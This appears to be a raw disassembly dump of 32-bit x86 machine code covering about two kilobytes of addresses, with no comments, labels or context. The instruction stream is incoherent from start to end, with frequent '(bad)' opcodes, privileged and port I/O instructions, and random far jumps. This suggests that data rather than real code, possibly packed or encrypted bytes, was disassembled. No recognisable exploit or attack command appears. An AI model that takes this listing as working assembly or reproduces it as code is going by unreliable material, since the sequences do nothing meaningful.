  413fc1:	ja     0x413f4e
  413fc3:	jmp    0xc405:0x85d632c0
  413fca:	test   dh,bl
  413fcc:	hlt    
  413fcd:	xor    al,0x93
  413fcf:	add    eax,0x119ce15a
  413fd4:	xchg   esi,eax
  413fd5:	fs pop ebx
  413fd7:	sub    al,0x5b
  413fd9:	enter  0x3d24,0xab
  413fdd:	push   esi
  413fde:	call   0x1cbd:0x1c3d8949
  413fe5:	repz jg 0x413f81
  413fe8:	into   
  413fe9:	mov    esi,0xa61a8f91
  413fee:	daa    
  413fef:	call   0xa724:0xeb1aa4f
  413ff6:	xor    eax,0xe4233d69
  413ffb:	in     al,0xdb
  413ffd:	mov    ebp,0x83bd018e
  414002:	inc    ecx
  414003:	and    al,0x20
  414005:	test   al,0x72
  414007:	push   eax
  414008:	aad    0xc4
  41400a:	xchg   edi,eax
  41400b:	imul   edi,eax,0xa521299d
  414011:	out    0xb8,eax
  414013:	les    ebx,FWORD PTR [eax-0x33]
  414016:	imul   eax,esp,0x5185e264
  41401c:	ins    BYTE PTR es:[edi],dx
  41401d:	sub    al,0xa4
  41401f:	sub    DWORD PTR [ebx],edi
  414021:	jnp    0x413fc1
  414023:	pop    es
  414024:	sbb    BYTE PTR [edx+0x5a],bl
  414027:	inc    ecx
  414028:	aad    0x37
  41402a:	pavgw  mm2,QWORD PTR [esi]
  41402d:	std    
  41402e:	push   0x24
  414030:	enter  0xec81,0xc9
  414034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414035:	jmp    0x413fc2
  414037:	add    BYTE PTR [edx],0x90
  41403a:	sbb    dh,BYTE PTR [ecx-0x7b288e4]
  414040:	mov    edx,0xaa35dbde
  414045:	and    ebp,esi
  414047:	inc    ecx
  414048:	and    ecx,DWORD PTR [edx]
  41404a:	fidiv  WORD PTR [ecx]
  41404c:	jp     0x413fe5
  41404e:	sbb    cl,BYTE PTR [esi]
  414050:	shl    BYTE PTR [esi+0x44fecaf6],0x6c
  414057:	pusha  
  414058:	mov    tr1,edi
  41405b:	cmp    BYTE PTR [ebx-0x6c],dl
  41405e:	sub    DWORD PTR [ebp+0x2717924e],edx
  414064:	dec    ebp
  414065:	mov    al,0xe6
  414067:	pop    edi
  414068:	stos   BYTE PTR es:[edi],al
  414069:	inc    ebx
  41406a:	cmp    DWORD PTR [eax],0x6af6a973
  414070:	inc    esi
  414071:	mov    ds:0xa183b6f2,eax
  414076:	retf   
  414077:	mov    ebp,0x611bf92b
  41407c:	mov    ebx,?
  41407e:	mov    al,0xfd
  414080:	je     0x41409c
  414082:	fidiv  DWORD PTR [edx]
  414084:	cmp    al,BYTE PTR [edi+0x247377d9]
  41408a:	int    0x57
  41408c:	div    esp
  41408e:	cld    
  41408f:	push   edi
  414090:	aaa    
  414091:	fld    TBYTE PTR [ebp+0x7adb3f2b]
  414097:	cmp    BYTE PTR [ecx],0x4d
  41409a:	push   edx
  41409b:	pop    ss
  41409c:	sbb    esp,ebx
  41409e:	xor    eax,0x8b5a432f
  4140a3:	push   es
  4140a4:	jp     0x414123
  4140a6:	(bad)  [eax-0x77]
  4140a9:	pop    ebp
  4140aa:	scas   eax,DWORD PTR es:[edi]
  4140ab:	push   edi
  4140ac:	add    al,0x47
  4140ae:	data16 or BYTE PTR [esi+0x40c1a513],bl
  4140b5:	es int3 
  4140b7:	sub    al,0x42
  4140b9:	push   edi
  4140ba:	sbb    BYTE PTR [ebx],0x30
  4140bd:	cdq    
  4140be:	pop    esp
  4140bf:	mov    cl,0x34
  4140c1:	pop    esi
  4140c2:	pop    esi
  4140c3:	pop    ebp
  4140c4:	cld    
  4140c5:	push   es
  4140c6:	jmp    0x577d:0xe0f6900d
  4140cd:	inc    ebx
  4140ce:	hlt    
  4140cf:	push   eax
  4140d0:	inc    DWORD PTR [esi+0x6e]
  4140d3:	jnp    0x414074
  4140d5:	and    DWORD PTR [edi-0x69],esi
  4140d8:	inc    ebx
  4140d9:	sbb    DWORD PTR [ebp-0x58],0xffffffbf
  4140dd:	test   al,0xad
  4140df:	(bad)  
  4140e0:	inc    ecx
  4140e1:	adc    ah,BYTE PTR [eax-0x7b]
  4140e4:	xor    ch,dl
  4140e6:	call   DWORD PTR [eax-0x5b51751e]
  4140ec:	sub    ch,BYTE PTR ds:0x20666fab
  4140f2:	adc    eax,0xc0804f40
  4140f7:	mov    al,BYTE PTR [edx-0x20b81092]
  4140fd:	dec    ecx
  4140fe:	adc    ebp,DWORD PTR [esi+0x57efc96c]
  414104:	pop    ss
  414105:	je     0x4140fa
  414107:	mov    edx,0xb62c08ba
  41410c:	xchg   edx,eax
  41410d:	test   DWORD PTR ds:0x3ef15688,esi
  414113:	cmp    ebp,edx
  414115:	xor    BYTE PTR [ebx],ah
  414117:	clc    
  414118:	(bad)  
  414119:	jecxz  0x41411b
  41411b:	add    al,BYTE PTR [ecx+0x7ca61b8b]
  414121:	jl     0x414176
  414123:	ss out 0x61,al
  414126:	jnp    0x414111
  414128:	inc    esi
  414129:	inc    esp
  41412a:	clc    
  41412b:	inc    esp
  41412c:	call   0x743a:0xaa55bfb3
  414133:	sub    BYTE PTR [ecx+0x11832ff1],0xeb
  41413a:	(bad)  
  41413b:	in     eax,0x6e
  41413d:	ficomp WORD PTR [eax+eax*8+0x54]
  414141:	cmp    DWORD PTR [edx+eax*2],ebx
  414144:	jns    0x4140d2
  414146:	mov    ds:0x7623c054,eax
  41414b:	dec    ebp
  41414c:	push   0x16574ae9
  414151:	jmp    0x414181
  414153:	dec    ecx
  414154:	sub    ah,BYTE PTR [eax]
  414156:	enter  0xa211,0x98
  41415a:	jbe    0x4141a8
  41415c:	unpckhps xmm0,XMMWORD PTR [ebp+0x25]
  414160:	push   es
  414161:	cs div al
  414164:	or     ah,bl
  414166:	and    bl,ch
  414168:	(bad)  
  414169:	cdq    
  41416a:	jno    0x41419e
  41416c:	sahf   
  41416d:	sbb    BYTE PTR [ebx+0x170fd779],ch
  414173:	fnstcw WORD PTR [esi+0x53f57e6]
  414179:	inc    ebx
  41417a:	mov    ebx,0x30ccd818
  41417f:	fld    TBYTE PTR [ebp+0xf135d16]
  414185:	sub    al,0x76
  414187:	mov    BYTE PTR [ecx+0x2f43a1f0],dl
  41418d:	xchg   esi,eax
  41418e:	pop    ss
  41418f:	sbb    eax,0x4855a01
  414194:	rcl    BYTE PTR [esi-0x62],1
  414197:	shr    DWORD PTR [ebp+0xa98f20e],cl
  41419d:	add    bh,ch
  41419f:	out    0xb4,eax
  4141a1:	push   edi
  4141a2:	sbb    BYTE PTR [esi-0x1f],0xb3
  4141a6:	stos   BYTE PTR es:[edi],al
  4141a7:	and    esi,ebx
  4141a9:	lock add BYTE PTR [edi+ebp*2],al
  4141ad:	loopne 0x414205
  4141af:	lock push ebp
  4141b1:	mov    edx,0x3486c304
  4141b6:	pop    ecx
  4141b7:	mov    al,0xb8
  4141b9:	mov    esp,0x2384aa83
  4141be:	cli    
  4141bf:	je     0x4141bc
  4141c1:	mov    dl,0xa3
  4141c3:	mov    edi,0x4cae3844
  4141c8:	xchg   esi,eax
  4141c9:	fucomip st,st(3)
  4141cb:	push   es
  4141cc:	fimul  DWORD PTR [edx+ebx*2+0x31c11b17]
  4141d3:	daa    
  4141d4:	repnz mov bl,0xd7
  4141d7:	imul   ecx,DWORD PTR [ecx],0xa6045c1d
  4141dd:	jmp    0x9f114d32
  4141e2:	sbb    eax,0x8d23de1
  4141e7:	pop    eax
  4141e8:	not    DWORD PTR [eax-0x7e]
  4141eb:	scas   eax,DWORD PTR es:[edi]
  4141ec:	add    BYTE PTR [esi-0x14],cl
  4141ef:	es loop 0x414255
  4141f2:	ja     0x4141de
  4141f4:	sub    BYTE PTR [ebx],bh
  4141f6:	retf   
  4141f7:	add    ecx,eax
  4141f9:	imul   esi,DWORD PTR [edx+0x69],0x7f7d0107
  414200:	ret    
  414201:	dec    esp
  414202:	loope  0x41427f
  414204:	xchg   ebp,eax
  414205:	or     DWORD PTR [edx],ebp
  414207:	xlat   BYTE PTR ds:[ebx]
  414208:	(bad)  
  414209:	push   0x69
  41420b:	ss repnz sbb al,0xec
  41420f:	jb     0x41422d
  414211:	xchg   ebx,eax
  414212:	pop    edi
  414213:	ins    DWORD PTR es:[edi],dx
  414214:	cli    
  414215:	adc    ah,bh
  414217:	adc    cl,bl
  414219:	mov    WORD PTR [eax-0x77edad60],ss
  41421f:	ins    BYTE PTR es:[edi],dx
  414220:	into   
  414221:	jg     0x414209
  414223:	cmp    BYTE PTR [ecx-0x80],dl
  414226:	imul   BYTE PTR [edi-0x284d2016]
  41422c:	sar    ebx,0x41
  41422f:	and    al,0x16
  414231:	and    DWORD PTR ds:0xa101f655,esi
  414237:	mov    ds:0xe63fc719,eax
  41423c:	fstp   TBYTE PTR [edi-0x5ea21d64]
  414242:	cld    
  414243:	jbe    0x4141f9
  414245:	push   edi
  414246:	cmp    eax,0xdcbffab4
  41424b:	xchg   edx,eax
  41424c:	dec    eax
  41424d:	mov    eax,ds:0x5c3514d0
  414252:	aaa    
  414253:	aaa    
  414254:	leave  
  414255:	mov    ecx,0x29ebf74a
  41425a:	pop    eax
  41425b:	jno    0x41427f
  41425d:	stc    
  41425e:	jne    0x41426d
  414260:	sti    
  414261:	in     eax,0x1f
  414263:	out    dx,al
  414264:	out    0xcc,al
  414266:	mov    BYTE PTR [ecx+0x2e],ch
  414269:	push   ecx
  41426a:	mov    eax,0x2b4d0ec7
  41426f:	xchg   edi,eax
  414270:	mov    ah,0x22
  414272:	and    DWORD PTR [edx],ebx
  414274:	sbb    BYTE PTR [ecx-0x27],bl
  414277:	mov    al,0xae
  414279:	fcomp  DWORD PTR [ebp-0x68]
  41427c:	sbb    DWORD PTR [esi-0xab98cec],esi
  414282:	push   ebx
  414283:	mov    bh,0xd3
  414285:	pop    ebp
  414286:	mov    al,ch
  414288:	jno    0x4142ce
  41428a:	push   ss
  41428b:	mov    DWORD PTR [ebp-0x7efe7db5],esp
  414291:	loopne 0x4142f6
  414293:	cli    
  414294:	(bad)  
  414295:	lahf   
  414296:	pop    eax
  414297:	xchg   ecx,eax
  414298:	jecxz  0x4142d4
  41429a:	dec    ebp
  41429b:	int3   
  41429c:	pop    edi
  41429d:	jnp    0x414269
  41429f:	icebp  
  4142a0:	shl    DWORD PTR [edx+0x455544cc],1
  4142a6:	cdq    
  4142a7:	retf   0xe34d
  4142aa:	out    dx,eax
  4142ab:	sub    al,bh
  4142ad:	scas   al,BYTE PTR es:[edi]
  4142ae:	arpl   WORD PTR [ebx],dx
  4142b0:	sbb    DWORD PTR [edi],ecx
  4142b2:	arpl   WORD PTR [eax],bx
  4142b4:	xchg   edx,eax
  4142b5:	cdq    
  4142b6:	sub    al,0xe8
  4142b8:	sbb    edi,DWORD PTR [edi]
  4142ba:	push   edx
  4142bb:	aaa    
  4142bc:	mov    eax,0x3d033056
  4142c1:	out    0x2e,eax
  4142c3:	jg     0x414267
  4142c5:	jnp    0x41428e
  4142c7:	mov    bh,0xab
  4142c9:	loope  0x4142f9
  4142cb:	or     DWORD PTR [ecx],edx
  4142cd:	push   0x5
  4142cf:	xor    eax,0xfa84eddc
  4142d4:	push   eax
  4142d5:	je     0x4142c8
  4142d7:	xchg   ebx,eax
  4142d8:	adc    BYTE PTR [edi],dl
  4142da:	loop   0x4142be
  4142dc:	inc    ecx
  4142dd:	sbb    bl,0x4c
  4142e0:	mov    ah,0xf6
  4142e2:	push   ecx
  4142e3:	sub    ecx,DWORD PTR [ebx+eax*4-0x6202ce76]
  4142ea:	pop    esp
  4142eb:	xor    edx,DWORD PTR [esi-0x13cd66c2]
  4142f1:	test   al,0x59
  4142f3:	sub    al,0x56
  4142f5:	or     al,0xc5
  4142f7:	lock inc ecx
  4142f9:	data16 or dl,BYTE PTR [edx-0x22058af6]
  414300:	neg    BYTE PTR [edi+eax*4-0x5d]
  414304:	jns    0x414305
  414306:	jb     0x38cf6f71
  41430c:	cmp    edx,0x1f
  41430f:	ror    DWORD PTR [edx+0x5f],0xd5
  414313:	mov    bh,0x5c
  414315:	mov    dl,BYTE PTR [esp+ecx*8+0x2d]
  414319:	mov    eax,ds:0x739011da
  41431e:	sti    
  41431f:	sub    ebp,DWORD PTR [eax]
  414321:	sbb    al,0xad
  414323:	sti    
  414324:	xor    edx,ebp
  414326:	add    BYTE PTR [esi+0x75308356],dl
  41432c:	lock jae 0x41439c
  41432f:	pushf  
  414330:	and    bh,BYTE PTR ds:0x823c9fcb
  414336:	js     0x414301
  414338:	push   ds
  414339:	cvtdq2ps xmm0,xmm3
  41433c:	add    bh,BYTE PTR [ebx-0x80]
  41433f:	dec    eax
  414340:	retf   0x3169
  414343:	sbb    cl,bl
  414345:	jecxz  0x41431e
  414347:	mov    ch,0x98
  414349:	cmp    ch,BYTE PTR [ecx+0x58ce081f]
  41434f:	out    dx,al
  414350:	or     BYTE PTR [ecx+edx*1-0x3e356383],dh
  414357:	fdivr  DWORD PTR [eax-0xb28cad6]
  41435d:	inc    eax
  41435e:	cmp    ecx,esp
  414360:	mov    bl,0x7
  414362:	sub    al,0x40
  414364:	les    ebp,FWORD PTR [esi-0x51]
  414367:	dec    ecx
  414368:	mov    al,0x56
  41436a:	repz fsqrt 
  41436d:	mov    esi,0xc00c3821
  414372:	cmp    BYTE PTR [edi-0xf],cl
  414375:	dec    edx
  414376:	out    0x65,al
  414378:	inc    eax
  414379:	js     0x414348
  41437b:	add    edx,DWORD PTR [ecx+ebx*2]
  41437e:	jo     0x41439b
  414380:	xchg   edx,eax
  414381:	or     ah,BYTE PTR [edx]
  414383:	jmp    0x7e6e:0xdef9acf2
  41438a:	sbb    al,0x55
  41438c:	sbb    dl,BYTE PTR [esi-0x5d]
  41438f:	jl     0x414364
  414391:	call   DWORD PTR [ebx-0x635dded1]
  414397:	not    BYTE PTR [ecx-0x5d]
  41439a:	or     BYTE PTR [esi+0x60],bh
  41439d:	inc    esp
  41439e:	mov    si,WORD PTR [ebx]
  4143a1:	adc    ebx,DWORD PTR [edx-0x39300022]
  4143a7:	pop    edx
  4143a8:	dec    ebx
  4143a9:	adc    ebp,DWORD PTR [ebp+0x6f37ee38]
  4143af:	fisubr WORD PTR [esi]
  4143b1:	aaa    
  4143b2:	mov    ecx,ecx
  4143b4:	inc    esi
  4143b5:	or     dh,dh
  4143b7:	xchg   ecx,eax
  4143b8:	mov    esi,0x63aed0c0
  4143bd:	es xchg edi,eax
  4143bf:	pop    ebx
  4143c0:	stos   BYTE PTR es:[edi],al
  4143c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c3:	js     0x4143dd
  4143c5:	mov    ch,0x4e
  4143c7:	ss into 
  4143c9:	loop   0x4143c9
  4143cb:	cmp    dh,BYTE PTR [eax+0x26]
  4143ce:	or     DWORD PTR [ebx-0x3dd455eb],eax
  4143d4:	pop    ecx
  4143d5:	(bad)  
  4143d6:	xor    eax,0xb6815e75
  4143db:	cmp    dh,BYTE PTR [edi+0x3a3e6f05]
  4143e1:	(bad)  
  4143e2:	jmp    0xf8590a2d
  4143e7:	lods   eax,DWORD PTR ds:[esi]
  4143e8:	call   0xfbe5:0xdd006a97
  4143ef:	pusha  
  4143f0:	in     al,0x6
  4143f2:	loop   0x4143ec
  4143f4:	cmp    edx,DWORD PTR [edi-0x4f]
  4143f7:	pop    ecx
  4143f8:	or     DWORD PTR [edi-0x3c],esp
  4143fb:	xor    eax,0xf8300623
  414400:	cs push cs
  414402:	sbb    DWORD PTR [edx+0x2f08829f],edi
  414408:	add    al,0x76
  41440a:	dec    esp
  41440b:	jmp    ebx
  41440d:	inc    edx
  41440e:	mov    edi,0x9a95db35
  414413:	out    0xdd,al
  414415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414416:	out    dx,al
  414417:	mov    ecx,0x7b1724d3
  41441c:	iret   
  41441d:	call   0x39dc0e81
  414422:	stos   BYTE PTR es:[edi],al
  414423:	dec    edi
  414424:	popf   
  414425:	cs or  ch,cl
  414428:	repz fs xchg edx,eax
  41442b:	jns    0x41444e
  41442d:	mov    bh,0x52
  41442f:	inc    esp
  414430:	push   ebp
  414431:	je     0x414462
  414433:	loope  0x4143d4
  414435:	adc    al,0xf3
  414437:	push   esp
  414438:	xchg   ecx,eax
  414439:	mov    ds:0x7b9431cb,al
  41443e:	jmp    0x3776:0x8603493
  414445:	adc    al,0x75
  414447:	jbe    0x4143cc
  414449:	cmp    al,0x41
  41444b:	lds    esi,FWORD PTR [esi]
  41444d:	sub    DWORD PTR [edi-0x5f8f0505],edi
  414453:	fadd   QWORD PTR [edx+0x43]
  414456:	adc    edi,esi
  414458:	adc    esi,DWORD PTR [ebx-0x48]
  41445b:	push   edi
  41445c:	inc    esi
  41445d:	mov    esi,DWORD PTR [ebx+0x491a201]
  414463:	out    0x2f,al
  414465:	ficom  DWORD PTR [esi-0x16]
  414468:	and    bl,0x5c
  41446b:	xor    dh,BYTE PTR [edi+0x5a321ba2]
  414471:	and    BYTE PTR [edx+0x49fab5b],dh
  414477:	jge    0x4144e5
  414479:	mov    cl,BYTE PTR [eax+0x23]
  41447c:	mov    eax,0x8eb50878
  414481:	cmp    al,0x7a
  414483:	adc    ch,BYTE PTR [edi]
  414485:	int    0x1b
  414487:	cli    
  414488:	test   eax,0x1e1be30e
  41448d:	push   ebp
  41448e:	or     cl,BYTE PTR [ebx]
  414490:	jbe    0x41447f
  414492:	jno    0x41444f
  414494:	xchg   eax,ebp
  414496:	xlat   BYTE PTR ds:[ebx]
  414497:	inc    ebx
  414498:	ds ja  0x41448c
  41449b:	add    al,0x1f
  41449d:	imul   si,WORD PTR [ecx+0x710f8bfa],0x33
  4144a5:	push   ebx
  4144a6:	mul    DWORD PTR [edx-0x6c0795a7]
  4144ac:	dec    ebx
  4144ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144ae:	inc    edi
  4144af:	adc    al,0x1b
  4144b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b2:	pop    es
  4144b3:	dec    ebp
  4144b4:	in     eax,0xab
  4144b6:	and    DWORD PTR [edx+0x2],ecx
  4144b9:	inc    edx
  4144ba:	(bad)  
  4144bb:	adc    ecx,ecx
  4144bd:	aas    
  4144be:	jmp    0x4144ae
  4144c0:	shl    BYTE PTR [ebx],1
  4144c2:	pop    ds
  4144c3:	mov    eax,0xba541dd8
  4144c8:	adc    ebx,esi
  4144ca:	stos   DWORD PTR es:[edi],eax
  4144cb:	aas    
  4144cc:	mov    WORD PTR [eax-0x3b1d9635],gs
  4144d2:	push   eax
  4144d3:	or     ebx,esp
  4144d5:	not    DWORD PTR [ecx]
  4144d7:	(bad)  
  4144d8:	stos   DWORD PTR es:[edi],eax
  4144d9:	sahf   
  4144da:	pop    ebx
  4144db:	test   BYTE PTR [ecx],dh
  4144dd:	adc    DWORD PTR [edi+0x28],0x6d
  4144e1:	fsubr  DWORD PTR [ecx]
  4144e3:	out    dx,al
  4144e4:	(bad)  
  4144e5:	pop    es
  4144e6:	stos   BYTE PTR es:[edi],al
  4144e7:	(bad)  
  4144e8:	(bad)
  4144eb:	dec    edx
  4144ec:	sub    BYTE PTR ds:0x4400d3c4,ch
  4144f2:	retf   0x51e9
  4144f5:	push   ds
  4144f6:	in     eax,0x2a
  4144f8:	out    0xdd,al
  4144fa:	call   0xebbb:0x48adb43f
  414501:	in     eax,0x84
  414503:	out    0x58,al
  414505:	pop    edx
  414506:	push   cs
  414507:	adc    edi,DWORD PTR [ebx]
  414509:	cld    
  41450a:	add    eax,0x20b20508
  41450f:	sub    DWORD PTR [ecx-0x59cb449c],edx
  414515:	sub    DWORD PTR [ecx+eiz*2-0x58],edi
  414519:	mov    esp,0xf20f2d63
  41451e:	std    
  41451f:	das    
  414520:	fwait
  414521:	out    0x7c,al
  414523:	dec    esi
  414524:	daa    
  414525:	jne    0xd2dff8bf
  41452b:	push   ebp
  41452d:	mov    DWORD PTR [ebx+0x13],esp
  414530:	fmul   QWORD PTR cs:[edi]
  414533:	cmp    ebp,DWORD PTR [ebp+0x1d127432]
  414539:	sbb    al,0x16
  41453b:	or     ecx,0x47
  41453e:	lahf   
  41453f:	call   0xe21e:0xdb4e6049
  414546:	and    esi,DWORD PTR [ebp-0x390e095b]
  41454c:	jne    0x41452b
  41454e:	(bad)  
  414550:	dec    ebx
  414551:	xchg   edx,eax
  414552:	push   esp
  414553:	popf   
  414554:	xor    eax,0xa4c96186
  414559:	pop    ds
  41455a:	xchg   edi,eax
  41455b:	iret   
  41455c:	mov    al,ds:0x215425fc
  414561:	(bad)  
  414563:	lahf   
  414564:	test   al,0x38
  414566:	sbb    al,0x12
  414568:	jnp    0x414562
  41456a:	jae    0x414503
  41456c:	(bad)
  41456f:	fst    DWORD PTR [eax-0x3d]
  414572:	retf   0xf1fd
  414575:	(bad)  
  414576:	ffree  st(7)
  414578:	mov    ch,0x87
  41457a:	fmulp  st(4),st
  41457c:	mov    dl,0xba
  41457e:	push   edx
  41457f:	in     al,dx
  414580:	add    esi,ecx
  414582:	or     cl,BYTE PTR [eax+edi*4-0xfef0576]
  414589:	dec    edx
  41458a:	jo     0x414566
  41458c:	cmp    BYTE PTR [eax+ebx*8],bl
  41458f:	dec    ebx
  414590:	imul   BYTE PTR [ebx]
  414592:	xor    al,0x3a
  414594:	loop   0x41451a
  414596:	js     0x4145d8
  414598:	ror    bl,0x4a
  41459b:	sub    cl,BYTE PTR [esi+eax*2]
  41459e:	and    al,0x12
  4145a0:	jae    0x41459f
  4145a2:	or     ah,cl
  4145a4:	add    BYTE PTR [edi-0x30880246],bl
  4145aa:	or     eax,0x35ccabe6
  4145af:	cmp    DWORD PTR [edi+0x46ad15b0],0x3b36144a
  4145b9:	call   0x7a5f0260
  4145be:	aad    0x18
  4145c0:	repnz xor ebx,ecx
  4145c3:	ins    BYTE PTR es:[edi],dx
  4145c4:	mov    ds:0x6504d217,al
  4145c9:	mov    al,ds:0xedb9ee9e
  4145ce:	fs (bad) 
  4145d0:	fst    DWORD PTR [eax]
  4145d2:	cmp    esi,edx
  4145d4:	fdiv   DWORD PTR [edi+0x65]
  4145d7:	inc    esp
  4145d8:	push   edx
  4145d9:	xor    cl,0x32
  4145dc:	xor    eax,0xd8fa7afa
  4145e1:	cmp    al,0x10
  4145e3:	leave  
  4145e4:	(bad)  
  4145e5:	push   edx
  4145e6:	pop    ebx
  4145e7:	pop    ecx
  4145e8:	pushf  
  4145e9:	int3   
  4145ea:	cmp    BYTE PTR [ebx+0x56b1e9b5],0xcb
  4145f1:	ret    0x44ae
  4145f4:	dec    ebx
  4145f5:	pushf  
  4145f6:	inc    DWORD PTR [edx]
  4145f8:	and    al,0x8c
  4145fa:	xchg   ecx,eax
  4145fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fc:	nop
  4145fd:	or     esi,DWORD PTR [ecx-0x5cedc43]
  414603:	xor    eax,0x6f68d84b
  414608:	ja     0x4145f2
  41460a:	mov    al,ds:0x4fe02df8
  41460f:	mov    cl,0x9b
  414611:	(bad)  
  414612:	push   0xffffffc1
  414614:	mov    al,ds:0x3fd18097
  414619:	(bad)  
  41461a:	fcomp  QWORD PTR [edx-0x4b72a75d]
  414620:	mov    ebx,0x4dbbfc92
  414625:	or     DWORD PTR [edx+ebx*1+0x48],edx
  414629:	fwait
  41462a:	hlt    
  41462b:	popf   
  41462c:	mov    eax,ds:0x51da8cdd
  414631:	jbe    0x414620
  414633:	mov    ebp,fs
  414635:	mov    ebx,0x6bbe1356
  41463a:	mov    eax,0x750bd100
  41463f:	arpl   WORD PTR [ebx],cx
  414641:	dec    eax
  414642:	adc    BYTE PTR [ebx-0x29],bl
  414645:	inc    ebp
  414646:	xor    BYTE PTR [ebx+0x114f99f3],0xff
  41464d:	mov    ecx,0x18905d48
  414652:	fnsetpm(287 only) 
  414654:	sbb    eax,0xbcd982e5
  414659:	int    0x9d
  41465b:	or     eax,0xcb735e15
  414660:	aas    
  414661:	je     0x414613
  414663:	(bad)  
  414664:	cmp    eax,ebp
  414666:	(bad)  
  414668:	cmc    
  414669:	sbb    al,BYTE PTR [esi]
  41466b:	mov    ebx,0x3a36ea8a
  414670:	xchg   ebx,eax
  414671:	cli    
  414672:	ss jmp 0xb4417874
  414678:	test   al,0xd0
  41467a:	std    
  41467b:	idiv   DWORD PTR cs:[ecx-0x7a788ea9]
  414682:	fdivr  st(3),st
  414684:	add    ecx,DWORD PTR [ebp-0x55c03044]
  41468a:	cmp    cl,cl
  41468c:	int3   
  41468d:	not    BYTE PTR [edx-0x79]
  414690:	pop    edi
  414691:	inc    DWORD PTR [eax-0x394e811a]
  414697:	stos   DWORD PTR es:[edi],eax
  414698:	xchg   edi,eax
  414699:	aam    0x13
  41469b:	jbe    0x4146ee
  41469d:	scas   eax,DWORD PTR es:[edi]
  41469e:	jne    0x414658
  4146a0:	or     edx,DWORD PTR [ecx-0x3ab5bd13]
  4146a6:	ins    BYTE PTR es:[edi],dx
  4146a7:	pop    eax
  4146a8:	ins    DWORD PTR es:[edi],dx
  4146a9:	fucomi st,st(7)
  4146ab:	iret   
  4146ac:	sub    edi,DWORD PTR [edx+edx*2]
  4146af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146b0:	and    ch,BYTE PTR [eax+0x7c6e71a2]
  4146b6:	test   eax,0xe2329009
  4146bb:	pushf  
  4146bc:	push   ebp
  4146bd:	cwde   
  4146be:	cmp    DWORD PTR [edi+esi*8],ebp
  4146c1:	aad    0xb3
  4146c3:	bound  ebp,QWORD PTR [esi+0x1a27344f]
  4146c9:	aas    
  4146ca:	and    bh,0xe9
  4146cd:	xchg   esi,eax
  4146ce:	imul   esp,esi,0x29eb883e
  4146d4:	adc    BYTE PTR [edi+0x4fc62a5],bl
  4146da:	xor    esp,esi
  4146dc:	jg     0x414708
  4146de:	(bad)  
  4146df:	std    
  4146e0:	enter  0x66a4,0x5a
  4146e4:	dec    ecx
  4146e5:	sub    dl,BYTE PTR [ebp-0x65]
  4146e8:	pop    eax
  4146e9:	pop    ebp
  4146ea:	in     al,0x44
  4146ec:	aaa    
  4146ed:	cmc    
  4146ee:	and    al,0xff
  4146f0:	std    
  4146f1:	and    BYTE PTR [ecx+edx*8],bl
  4146f4:	lea    ebx,[ecx]
  4146f6:	mov    ah,0x19
  4146f8:	(bad)  
  4146f9:	ds inc eax
  4146fb:	ret    0x1a99
  4146fe:	out    dx,eax
  4146ff:	stos   DWORD PTR es:[edi],eax
  414700:	sbb    BYTE PTR [esi-0x2af81bf2],ah
  414706:	addr16 push eax
  414708:	jo     0x41469d
  41470a:	jnp    0x41473f
  41470c:	test   al,0x84
  41470e:	ficomp WORD PTR [eax]
  414710:	js     0x4146b0
  414712:	xor    eax,0xf99bb250
  414717:	jno    0x41474b
  414719:	or     edi,DWORD PTR [ecx+0x45]
  41471c:	xchg   esp,eax
  41471d:	add    edi,ecx
  41471f:	pop    ecx
  414720:	aad    0x3
  414722:	jle    0x41471a
  414724:	mov    dh,0x54
  414726:	fs scas eax,DWORD PTR es:[edi]
  414728:	xor    ebp,DWORD PTR [edi-0xc591652]
  41472e:	adc    eax,0xdd3c4b8
  414733:	shl    ah,0xaf
  414736:	jbe    0x414753
  414738:	stc    
  414739:	or     edx,eax
  41473b:	or     ch,bh
  41473d:	les    edx,FWORD PTR [ecx-0x218c364f]
  414743:	sbb    al,0xb3
  414745:	push   ecx
  414746:	dec    edx
  414747:	pushf  
  414748:	and    edi,edx
  41474a:	sub    ch,BYTE PTR [ebp-0x2cfda9ff]
  414750:	jne    0x4147a5
  414752:	dec    edi
  414753:	jo     0x4147bb
  414755:	arpl   cx,cx
  414757:	dec    esp
  414758:	retf   
  414759:	xchg   BYTE PTR [edx+eiz*1],bh
  41475c:	(bad)  
  41475d:	cdq    
  41475e:	loop   0x4146e2
  414760:	arpl   WORD PTR [edi],sp
  414762:	sahf   
  414763:	into   
  414764:	imul   edx,DWORD PTR [ebx-0x1b2fd11f],0x48
  41476b:	lahf   
  41476c:	shl    DWORD PTR [ebx],0x58
  41476f:	push   esp
  414770:	sbb    ebp,DWORD PTR [edi]
  414772:	adc    dl,BYTE PTR [esi+ecx*4]
  414775:	mov    ch,BYTE PTR ds:0xa7ed8ba5
  41477b:	xchg   edi,eax
  41477c:	xchg   ah,dl
  41477e:	popa   
  41477f:	out    dx,al
  414780:	loop   0x41475a
  414782:	pop    edx
  414783:	mov    edx,0x3cd86322
  414788:	push   cs
  414789:	and    ch,ch
  41478b:	or     DWORD PTR [edx],edi
  41478d:	mov    BYTE PTR [ebx],al
  41478f:	push   cs
  414790:	je     0x414804
  414792:	rcl    DWORD PTR gs:[esi+edi*8],0xb5
  414797:	out    0xa0,al
  414799:	in     al,dx
  41479a:	pop    esi
  41479b:	and    eax,0xe156d61a
  4147a0:	imul   esp,eax,0x4d
  4147a3:	sbb    edi,ebp
  4147a5:	inc    eax
  4147a6:	ficom  WORD PTR [ebx]
  4147a8:	cdq    
  4147a9:	mov    bl,0xf8
  4147ab:	sar    BYTE PTR [edi],cl
  4147ad:	dec    edx
  4147ae:	test   al,0x17
  4147b0:	jp     0x4147d8
  4147b2:	dec    DWORD PTR [ebp-0xa]
  4147b5:	(bad)  
  4147b6:	lock outs dx,DWORD PTR ds:[esi]
  4147b8:	(bad)  
  4147b9:	into   
  4147ba:	in     eax,dx
  4147bb:	call   0xfe85b590
  4147c0:	sbb    ah,ah
  4147c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c3:	push   ecx
  4147c4:	xchg   ebp,eax
  4147c5:	jb     0x4147a5
